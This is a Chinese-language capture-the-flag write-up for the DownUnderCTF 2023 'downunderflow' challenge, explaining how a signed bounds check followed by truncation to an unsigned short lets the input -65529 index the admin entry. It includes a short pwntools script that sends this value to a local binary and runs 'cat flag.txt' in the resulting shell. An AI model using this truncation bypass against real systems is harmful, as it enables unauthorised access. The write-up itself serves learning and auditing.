# DownUnderCTF 2023 downunderflow Writeup

## 题目简述

程序要求选择下标小于 7 的用户，并在下标为 7 时进入 `admin`。检查函数使用有符号 `int`，返回值却被赋给 `unsigned short`，形成了检查类型和使用类型不一致的问题。

## 解题过程

输入值先经过：

```c
if (x >= 7) {
    exit(1);
}
```

负数能够通过这个检查。随后转换为 16 位无符号整数，相当于模 $2^{16}=65536$。为了让转换结果为 7，选择：

$$
-65529\equiv7\pmod{65536}.
$$

因此直接发送 `-65529`：

```python
from pwn import *

io = process("./downunderflow")
io.sendlineafter(b"Select user to log in as: ", b"-65529")
io.sendline(b"cat flag.txt")
io.interactive()
```

程序以 `logins[7]` 登录为管理员并启动 shell，读取到：

```text
DUCTF{-65529_==_7_(mod_65536)}
```

## 方法总结

漏洞来自有符号检查与无符号截断之间的语义差异。审计数组下标时，不能只看边界判断，还应沿数据流确认返回类型、赋值转换和最终索引宽度；这里一个满足同余关系的负数即可绕过检查。
